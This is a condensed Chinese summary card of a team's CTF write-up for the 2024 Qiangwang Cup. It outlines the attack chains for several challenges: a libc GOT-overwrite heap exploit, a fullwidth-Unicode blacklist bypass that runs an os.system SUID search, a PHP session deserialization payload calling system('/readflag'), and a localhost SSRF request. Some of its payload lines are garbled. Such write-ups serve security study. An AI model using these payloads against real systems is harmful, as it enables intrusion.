---
title: "第八届强网杯 writeup by Mini-Venom"
category: misc
tags: ["强网杯", "misc", "baby_heap", "libc-got-overwrite", "libcdb-search", "PyBlockly"]
signals: ["强网杯 2024", "baby_heap", "libc-got-overwrite", "libcdb-search", "PyBlockly", "Unicode-fullwidth", "SUID-find", "platform", "PHP-session-deserialize", "heap_exploit", "Mini-Venom", "libc", "got", "Unicode"]
difficulty: medium
source: "https://www.ctfiot.com/213637.html"
tools: ["PHP", "Python"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第八届强网杯 writeup by Mini-Venom

> 赛事：强网杯 2024 | 方向：misc | 难度：medium | 工具：PHP、Python

## 一句话总结

第八届强网杯 Mini-Venom：baby_heap 改 libc.got + PyBlockly 全角 Unicode 绕 + platform session 反序列化 + proxy SSRF + snake BFS。

## 攻击链

1. Pwn baby_heap: malloc(0x700) + malloc(0x10) + free(1) + show(1) 泄 libc_base = -0x21ace0
2. got = libc + 0x21A118, s(p64(got)) + s(p64(libc_base+puts)) 写任意地址
3. sla('': '', ''5'') + sl(''2'') 触发利用
4. Web PyBlockly: 全角 Unicode 绕黑名单 - → \uFF0D, . → \uFF0E, / → \uFF0F, = → \uFF1D, > → \uFF1E
5. PyBlockly 内置 python __builtins__.len = lambda x: __import__(''os'').system(''find / -perm -u=s -type f'')
6. Web platform: SessionManager 黑名单替换为空 + 序列化逃逸
7. notouchitsclass eval RCE: username=fewww&password[]=systemsystemeval&password[]=";i:1;s:7:"fewww";}a|O:15:"notouchitsclass":1:{s:4:"data";s:20:"system(''/readflag'');
8. Web proxy: /v2/api/proxy JSON {"url": "http://127.0.0.1:8769/v1/api/flag", "method": "POST"}
9. Web snake: BFS 路径搜索 GRID_SIZE=19 找最优路径

## 关键 payload

```
libc_base = u64 - 0x21ace0 + got = libc + 0x21A118 + 全角 Unicode + pearcmd 序列化逃逸
```

## 经验教训

libc 任意地址写可改自身 .got 劫持；黑名单替换为空是经典 PHP session 序列化逃逸前提；全角 Unicode 同形字符绕是中文 CTF 特色。

## 标签

baby_heap、libc-got-overwrite、libcdb-search、PyBlockly、Unicode-fullwidth、SUID-find、platform、PHP-session-deserialize、notouchitsclass-eval、proxy-SSRF、snake-BFS

## 参考来源

- https://www.ctfiot.com/213637.html
- 原文件：第八届强网杯_writeup_by_Mini-Venom.full.md
